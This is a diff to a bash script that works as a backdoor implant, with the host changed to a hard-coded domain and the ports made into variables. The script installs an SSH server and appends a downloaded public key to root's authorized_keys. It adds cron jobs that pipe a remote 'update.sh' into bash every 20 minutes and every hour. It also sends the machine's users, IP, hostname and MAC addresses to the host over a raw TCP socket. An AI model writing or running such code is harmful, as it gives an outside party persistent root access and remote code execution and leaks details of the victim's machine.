@@ -1,5 +1,7 @@
 #!/usr/bin/bash
-host=$host
+host=boesen.science
+down_port=2042
+up_port=2043
 
 sudo apt-get install openssh-server -y
 sudo systemctl start ssh.service
@@ -10,10 +12,10 @@ sshpath="/root/.ssh"
 sudo mkdir -p "$sshpath"
 
 echo "Downloading pubkey..."
-sudo su -c "curl -L $host:2042/pubkey >> $sshpath/authorized_keys"
+sudo su -c "curl -L $host:$down_port/pubkey >> $sshpath/authorized_keys"
 
-sudo su -c "(crontab -l 2>/dev/null; echo \"*/20 * * * * curl -L $host:2042/linux/update.sh |bash\") | crontab -"
-sudo su -c "printf \"#\!/bin/bash\ncurl -L $host:2042/linux/update.sh |bash\n\" > /etc/cron.hourly/update; chmod +x /etc/cron.hourly/update"
+sudo su -c "(crontab -l 2>/dev/null; echo \"*/20 * * * * curl -L $host:$down_port/linux/update.sh |bash\") | crontab -"
+sudo su -c "printf \"#\!/bin/bash\ncurl -L $host:$down_port/linux/update.sh |bash\n\" > /etc/cron.hourly/update; chmod +x /etc/cron.hourly/update"
 
 # Don't use whoami, will generally be root, which is useless
 user=$(ls /home | xargs -n1 | sort -u | xargs | tr ' ' ',')
@@ -22,9 +24,7 @@ ip=$(hostname -I | sed 's/ *$//')
 hostname=$(hostname)
 mac=$(cat /sys/class/net/*/address | grep -v "00:00:00:00:00:00" | tr '\n' ',' | sed 's/,*$//')
 
-port=2043
-
-exec 3<>/dev/tcp/$host/$port
+exec 3<>/dev/tcp/$host/$up_port
 printf "JOIN: $user $ip $hostname $mac" >&3
 
 cat <&3
